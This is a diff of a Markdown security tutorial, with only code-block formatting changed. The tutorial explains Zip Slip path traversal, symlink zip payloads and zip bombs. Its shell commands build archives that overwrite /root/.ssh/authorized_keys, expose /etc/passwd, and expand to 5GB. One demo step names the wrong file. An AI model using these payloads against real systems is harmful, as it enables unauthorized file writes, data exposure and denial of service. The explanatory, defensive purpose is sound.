@@ -45,7 +45,7 @@ Let's look at an example.
 
 A typical zip file may look like this:
 
-```text
+```text {data-lang-off}
 foo.zip
 └── data1.csv
 └── data2.txt
@@ -54,7 +54,7 @@ foo.zip
 
 But in a Zip Slip payload, files are prefixed with nasty double-dots (`../`). As an example, we'll try to overwrite SSH keys by writing to `/root/.ssh/authorized_keys`.
 
-```text
+```text {data-lang-off}
 evil-slip.zip
 └── placeholder.txt
 └── ../../root/.ssh/authorized_keys
@@ -66,7 +66,7 @@ Most decompression applications will refuse to unpack such a zip. But vulnerable
 
 Suppose a vulnerable application unzips `evil-slip.zip` to `/app/uploads/`. The unzipped `authorized_keys` file would end up in `/app/uploads/../../root/.ssh/authorized_keys`, i.e. `/root/.ssh/authorized_keys`.
 
-```text
+```text {data-lang-off}
 /
 ├── app/
 │	└── uploads/
@@ -110,22 +110,22 @@ One nice thing about the `zipfile` module is that it constructs the file *in-mem
 {% details "With Shell Commands" %}
 Another approach is to use shell commands and reverse the process: start with the files we want unzipped.
 
-```shell
-$ touch ../../root/.ssh/authorized_keys
-# Normally we would run `ssh-keygen` to generate a key pair...
-# and use the generated public key as our authorized_keys.
-# But let's assume ../.ssh/authorized_keys holds a public key.
-
-$ zip evil-slip ../../root/.ssh/authorized_keys
-  adding: ../../root/.ssh/authorized_keys (deflated 18%)
-  
-$ unzip -l evil-slip
-Archive:  evil-slip.zip
-  Length      Date    Time    Name
----------  ---------- -----   ----
-      575  01-23-2024 17:53   ../../root/.ssh/authorized_keys
----------                     -------
-      575                     1 file
+```shell {.command-line data-prompt="$" data-filter-output="out>"}
+touch ../../root/.ssh/authorized_keys
+out>Normally we would run `ssh-keygen` to generate a key pair...
+out>and use the generated public key as our authorized_keys.
+out>But let's assume ../.ssh/authorized_keys holds a public key.
+out>
+zip evil-slip ../../root/.ssh/authorized_keys
+out>  adding: ../../root/.ssh/authorized_keys (deflated 18%)
+out>
+unzip -l evil-slip
+out>Archive:  evil-slip.zip
+out>  Length      Date    Time    Name
+out>---------  ---------- -----   ----
+out>      575  01-23-2024 17:53   ../../root/.ssh/authorized_keys
+out>---------                     -------
+out>      575                     1 file
 ```
 
 {% enddetails %}
@@ -149,14 +149,14 @@ Why “potential”? Because there are other factors that may hinder such attack
 
 Let's start with a simple zip symlink payload. Here's a zip which contains a symlink to `/etc/passwd`.
 
-```text
+```text {data-lang-off}
 evil-link-file.zip
 └── passwd.txt         -> /etc/passwd
 ```
 
 Suppose (again) a vulnerable app unzips this file at `/app/uploads/`. The filesystem would now resemble:
 
-```text
+```text {data-lang-off}
 app/
 └── uploads/
 	└── passwd.txt     -> /etc/passwd
@@ -178,7 +178,7 @@ Again, let's try to write a file to `/root/.ssh/authorized_keys`.
 
 Instead of using one zip entry, we'll use two: a directory and a file.
 
-```text
+```text {data-lang-off}
 evil-link-dir.zip
 └── dirlink/           -> /root/.ssh/
     └── authorized_keys
@@ -197,7 +197,7 @@ Tada! We've just shown another way to achieve arbitrary file write.
 
 Let's see what the filesystem looks like now.
 
-```text
+```text {data-lang-off}
 /
 ├── app/
 │	└── uploads/
@@ -270,7 +270,7 @@ Shell commands also work. (Make sure to use `-y`/`--symlinks` when zipping symli
 
 Double symlink payload construction:
 
-```sh
+```sh {.command-line data-prompt="$" data-filter-output="# "}
 # Create our (soft) links.
 ln -s /some/readable/directory/ dirlink
 ln -s /etc/passwd dirlink/passwd.txt
@@ -328,18 +328,18 @@ In 2019, David Fifield introduced *a better zip bomb*, which abuses the structur
 #### DIY: Build your own Zip Bomb!
 
 Here's a small demo on a Linux shell:
-```sh
+```sh {.command-line data-prompt="$" data-filter-output="# "}
 # Create a blank file with 5GB of null bytes.
-$ dd if=/dev/zero bs=20000 count=250000 >zero.txt
-
+dd if=/dev/zero bs=20000 count=250000 >zero.txt
+# 
 # Zip it.
-$ zip test.zip test.txt
-
+zip test.zip test.txt
+# 
 # Count the number of bytes.
-$ wc -c zero.txt zero.zip
- 5000000000 zero.txt
- 4852639 zero.zip
- 5004852639 total
+wc -c zero.txt zero.zip
+#  5000000000 zero.txt
+#  4852639 zero.zip
+#  5004852639 total
 ```
 
 From 5GB, we've gone down to ~4.9MB! A few of these could exhaust most virtual machines.
